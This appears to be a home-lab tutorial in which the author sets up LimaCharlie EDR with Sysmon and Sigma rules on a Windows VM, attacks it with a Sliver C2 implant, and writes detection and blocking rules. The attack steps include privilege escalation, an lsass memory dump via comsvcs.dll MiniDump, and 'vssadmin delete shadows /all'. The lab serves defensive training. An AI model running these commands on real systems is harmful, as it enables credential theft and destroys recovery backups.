# Intro

This is a fully cloud-hosted environment in Azure. For our EDR, we will be using LimaCharlie. It has a cross-platform EDR agent and also handles log shipping/ingestion as well as a threat detection engine. It also has a free tier for 2 systems, making it ideal for our environment.

## LimaCharlie

First, we're going to create an account at LimaCharlie. After logging in, we will create an organization. Here are our organization details.

![create_org](https://github.com/tylerthompson1/SOC/assets/53204601/3d72cd91-969f-4f22-971a-55e5750ba84b)

From there, we will create our first sensor.

![createsensor](https://github.com/tylerthompson1/SOC/assets/53204601/2f861e60-6cdb-4260-9eaa-db10939eed6a)

1. Select the Endpoint tab
2. Select Windows
3. Provide a description
4. Click Create
5. Select the Installation Key we just created
6. 
   ![installationkey](https://github.com/tylerthompson1/SOC/assets/53204601/d5ca091a-7075-4f83-a50c-82d33ffe5ddc)
   
8. We'll be using the x86-64 (.exe) sensor.
9. 
 ![x86](https://github.com/tylerthompson1/SOC/assets/53204601/0948742a-4c6c-4b29-a5cc-d5f1db130d57)


Our sensor is already in our Windows VM. So we will change to the directory where it has been placed.

```bash
cd C:\Users\sywtbsa\Downloads
```
Then copy and paste the installation command from the screenshot above into the terminal.

This should be the expected output:

![sensor install](https://github.com/tylerthompson1/SOC/assets/53204601/60ea4a7c-e336-4e71-a092-604a7fa9135c)

### Sysmon

Now we're going to configure LimaCharlie to also send the Sysmon event logs in addition to its own EDR telemetry.

1. In the left-side menu, click "Artifact Collection Service" under "Sensors"
2. Click "Add Artifact Collection Rule"
    1. Name: `windows-sysmon-logs`
    2. Platforms: `Windows`
    3. Path Pattern: `wel://Microsoft-Windows-Sysmon/Operational:*`
    4. Retention Period: `10`
    5. Click "Save Rule"
3. LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC's own telemetry, but Sysmon is still a very powerful visibility tool that runs well alongside any EDR agent.
    1. The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we are about to enable largely depend on Sysmon logs as that is what most of them were written for.
4. Let's turn on the [open source Sigma ruleset](https://github.com/SigmaHQ/sigma) to assist our efforts.
        1. Click "Add-ons" in the top right corner <br>
           ![Pasted image 20240612144720](https://github.com/tylerthompson1/SOC/assets/53204601/14db1bc5-dd25-4129-887c-7315f3535942)<br>
        2. Click "Extensions" on the left side
        3. Find and click "ext-sigma"<br>
           ![Pasted image 20240612144756](https://github.com/tylerthompson1/SOC/assets/53204601/463d2409-eb6b-4541-a83e-8dde06ff5cdb)<br>

## Prepare for Attack & Defend

Sliver C2 is already installed on a WSL instance inside our Windows VM. Let's start our Sliver Client.

We'll open Ubuntu and enter a root shell.
```bash
sudo su
```
<br>![Pasted image 20240612145335](https://github.com/tylerthompson1/SOC/assets/53204601/0949539d-0a6b-4434-ac7a-cbaa3696edec)<br>
The Sliver Server will always run in the background of the WSL Ubuntu system. We can confirm that by calling
```PowerShell
systemctl status sliver
```
We see that it is running.
<br>![Pasted image 20240612145552](https://github.com/tylerthompson1/SOC/assets/53204601/183883f1-a5a1-499a-8064-414e06f36d38)<br>
We can launch the Sliver client using
```bash
sliver
```
<br>![Pasted image 20240612145716](https://github.com/tylerthompson1/SOC/assets/53204601/a5d19bb7-568f-41a9-bf87-b63ca8597759)<br>

We'll start the HTTP listener in case it's not already running.
```bash
http
```
<br>![Pasted image 20240612145837](https://github.com/tylerthompson1/SOC/assets/53204601/de9d2341-a383-4ee6-a9ad-4b4086c948bd)<br>

Our Sliver C2 is now ready to go!

## Generate C2 Implant

In the Sliver client terminal, we will generate our C2 implant and drop it into the Download directory of the Windows system. We're using the IP address of the Ubuntu subsystem as our C2 IP, since that is where the Sliver server is running.

```bash
generate --http 172.25.114.254 --save /mnt/c/Users/sywtbsa/Downloads/
```

Then we'll confirm that the Sliver Server has stored the implant using:
```bash
implants
```
<br>![Pasted image 20240612150532](https://github.com/tylerthompson1/SOC/assets/53204601/5cfb226d-81e3-4bf8-83ba-7268b39c37e4)<br>

It's important to note where our implant is saved to and what our payload name is.
We can verify the HTTP listener job is running by using:
```bash
jobs
```
<br>![Pasted image 20240612150655](https://github.com/tylerthompson1/SOC/assets/53204601/a2eed876-2731-47d5-9f5e-982f81fe03ed)<br>

## Command & Control

Now that the payload is on the Windows VM and the HTTP listener is running, we can execute the payload and establish our C2 session.

1. Launch an Elevated Command Prompt
2. Run the following command, making sure to use our actual payload name.
   ```bash
   C:\Users\sywtbsa\Downloads\[your_C2-implant.exe]
  
3. We can see our Sliver Client establish a connection
   <br>![Pasted image 20240612151051](https://github.com/tylerthompson1/SOC/assets/53204601/23ee2114-0f8a-40bd-a8dd-d14daf49443a)<br>
4. Which can be further verified by using ```sessions``` in the Sliver Client
  <br> ![Pasted image 20240612151200](https://github.com/tylerthompson1/SOC/assets/53204601/2287c053-af18-4798-ad7b-a9e82a7c55a1)<br>
5. In order to interact with the session, we will use
   ```bash
   use [session_id]

<br>![Pasted image 20240612151334](https://github.com/tylerthompson1/SOC/assets/53204601/34d6e4d0-6d2b-425a-b74c-528b1cc1186b)<br>

We are now directly interacting with the C2 session on the Windows VM. We're going to do some basic info gathering to learn more about our victim host.

```bash
info
```
Get basic information about the session.
<br>![Pasted image 20240612151604](https://github.com/tylerthompson1/SOC/assets/53204601/d86e98a5-9f67-4b89-9b9c-7bfb2f594207)<br>

```bash
whoami
```
Learn which user we're running as and privileges.
<br>![Pasted image 20240612151659](https://github.com/tylerthompson1/SOC/assets/53204601/7170f46b-d45e-4b31-b8e8-f339e662e9af)<br>

```bash
pwd
```
Print our implant's current directory.

```bash
netstat
```
Examine the network connections on the remote system.

```
ps -T
```
Identify processes on the remote system.
<br>![Pasted image 20240612152416](https://github.com/tylerthompson1/SOC/assets/53204601/fbf9b55d-bf1b-47c6-88e3-52caf737b6f8)<br>

Important note: Sliver highlights its own process in green and any detected defensive tools in red as well as listing them at the bottom.

## Observe EDR Telemetry

Let's jump back into LimaCharlie and look at what telemetry we have so far.

Clicking the Sensors List button on the left panel and drilling into our active Windows Sensor.

Clicking "Processes" shows us everything running on our Windows VM.

![Pasted image 20240612170252](https://github.com/tylerthompson1/SOC/assets/53204601/d761416b-1be2-4b6b-b573-fe48337d7554)

We can see our implant stands out by not being signed and active on the network.

![Pasted image 20240612170603](https://github.com/tylerthompson1/SOC/assets/53204601/38bcf161-6234-4afa-b2f3-14945c6df077)

Let's go inspect the File System where we know our implant is located and inspect the file hash.

![Pasted image 20240612170901](https://github.com/tylerthompson1/SOC/assets/53204601/e085a080-e0b5-4a02-92e0-79c49f41f6f8)

![Pasted image 20240612171004](https://github.com/tylerthompson1/SOC/assets/53204601/285d54d3-23d9-4667-a632-7aaf613846d5)


We see something interesting.

![Pasted image 20240612171048](https://github.com/tylerthompson1/SOC/assets/53204601/fb977b31-29c1-4031-bda5-f227fe886fd3)

Now, just because we get an "Item not found" does not mean that the file is innocent. We know this because we generated the payload ourselves, so
 VirusTotal is unlikely to have seen it before. As an analyst, this could indicate a custom-crafted attack.

Clicking "Timeline" on the left panel takes us to a real-time view of telemetry and event logs streaming from this position.

![Pasted image 20240612171419](https://github.com/tylerthompson1/SOC/assets/53204601/e9353f31-c703-4454-bc92-9808842c950c)

Since we know the IP address of our implant and the name, let's filter by that.

![Pasted image 20240612171606](https://github.com/tylerthompson1/SOC/assets/53204601/b32d2174-441d-4c32-82ef-41bf696027b7)

We can see a whole lot of information here and even where our process was created.

## Adversary

We're going to elevate our implant to a SYSTEM level process using:
```bash
getsystem
```
![Pasted image 20240612172112](https://github.com/tylerthompson1/SOC/assets/53204601/ee09a996-13f1-44b0-a0e7-4f2b561ad76f)

This spawns a new C2 session that we need to switch over to.

Let's run whoami to verify privilege levels.

![Pasted image 20240612172238](https://github.com/tylerthompson1/SOC/assets/53204601/31a82f45-284f-48ea-8d57-edeb97528fd3)

Next, let's imitate something an adversary would do: steal credentials on a system. We're going to dump the lsass.exe process from memory, a critical Windows process that holds sensitive information, such as credentials.

1. First, we need to identify the process ID of lsass.exe. We'll run the following command in our active C2 session:
   ```bash
   ps -e lsass.exe

![Pasted image 20240612172927](https://github.com/tylerthompson1/SOC/assets/53204601/40becfa5-e25d-4dad-bcb4-c0d28093da97)

2. Now, carrying forward the PID from the previous step, run the following command in the C2 session, replacing [PID] with our actual PID:
   ```bash
   execute rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [PID] C:\\Windows\\Temp\\lsass.dmp full

![Pasted image 20240612173753](https://github.com/tylerthompson1/SOC/assets/53204601/a64f943a-21d6-4c34-b27c-b292f18bca53)

This dumps the file to C:\Windows\Temp\lsass.dmp which an attacker could use to extract the credentials.

## Detection

Now that we have some attack telemetry, we'll switch back to LimaCharlie.
1. Drill into the Timeline of your Windows VM sensor and use the "Event Type Filters" to filter for "SENSITIVE_PROCESS_ACCESS" events.
2. Now because we know we're looking for rundll32.exe, we will also filter by that.<br>
   ![Pasted image 20240612181417](https://github.com/tylerthompson1/SOC/assets/53204601/64f41d84-ade5-477b-970e-82c4c62c358d)<br>
3. Now that we know what the event looks like, we can create a detection and response rule (D&R).
  <br> ![Pasted image 20240612181518](https://github.com/tylerthompson1/SOC/assets/53204601/a89f7da6-1535-41d2-82ff-50a7fc70ab84)<br>
4. Here is what our rule looks like:
  <br> ![Pasted image 20240612181715](https://github.com/tylerthompson1/SOC/assets/53204601/8c25fd36-d3c3-437f-8a04-07f57a5eddd8)<br>
- We're specifying that this detection should only look at SENSITIVE_PROCESS_ACCESS events where the victim, or target process, ends with lsass.exe - excluding a very noisy false positive in this VM, wmiprvse.exe
- In our "Respond" section, we're telling LimaCharlie to simply generate a detection "report" anytime this detection occurs.

Checking our "Detections" page, we can verify that it is generating an alert.
![Pasted image 20240612182128](https://github.com/tylerthompson1/SOC/assets/53204601/aa06e539-42f4-4fdc-bd4d-8224a128ba93)

## Blocking Attacks

While normally you will want to establish a baseline before writing a blocking rule, it can take time, and for demonstration purposes, we will jump straight to the fun part. A predictable attack is the deletion of shadow volume copies.

A basic command that would accomplish this is:
```bash
vssadmin delete shadows /all
```
Normally this command would not be run in a healthy environment, meaning two things:
- low false positive
- high threat activity

1. Let's start a remote shell in our Windows VM from our Sliver Implant using shell.
  <br>![Pasted image 20240612182902](https://github.com/tylerthompson1/SOC/assets/53204601/3e8dabb1-1e15-412c-abd1-e22e6e4465b8)<br>
2. We'll run the command above to delete the shadow copies. The output isn't really important here, but running the command will be enough to generate the telemetry we need.
3. Running whoami will verify we still have an active system shell.
   <br>![Pasted image 20240612183123](https://github.com/tylerthompson1/SOC/assets/53204601/98a5cb72-197b-4668-866d-0e5c43d069cb)<br>
4. We do have a new alert from our default Sigma rules that has picked up on our activity. If we click "View Event Timeline," we can see the raw event data that triggered this alert.
  <br> ![Pasted image 20240612183400](https://github.com/tylerthompson1/SOC/assets/53204601/59af1d7f-10b2-4629-963c-cbd9d64afc13)<br>
  <br> ![Pasted image 20240612183626](https://github.com/tylerthompson1/SOC/assets/53204601/5005cdde-41bc-48a0-b967-3728688c01e8)

5. Here is what our rule looks like: <br>![Pasted image 20240612184808](https://github.com/tylerthompson1/SOC/assets/53204601/e08287a5-3475-424d-a66d-c2a065c23c74)<br>
6. The "action: report" section simply fires off a Detection report to the "Detections" tab.
7. The "action: task" section is responsible for killing the parent process with deny_tree for the `vssadmin delete shadows /all` command.
8. Now if we try to delete the shadow volume again, we can see that our shell is forcibly exited from the Sliver Implant instance. <br>![Pasted image 20240612185138](https://github.com/tylerthompson1/SOC/assets/53204601/468852be-9ef0-4bf7-a588-2113d769c103)<br>
9. And checking our detections tab confirms that the rule has been fired! <br>![Pasted image 20240612185238](https://github.com/tylerthompson1/SOC/assets/53204601/9cddc4f2-9dbd-4ee0-ba3e-e2e4d68b2652)<br>
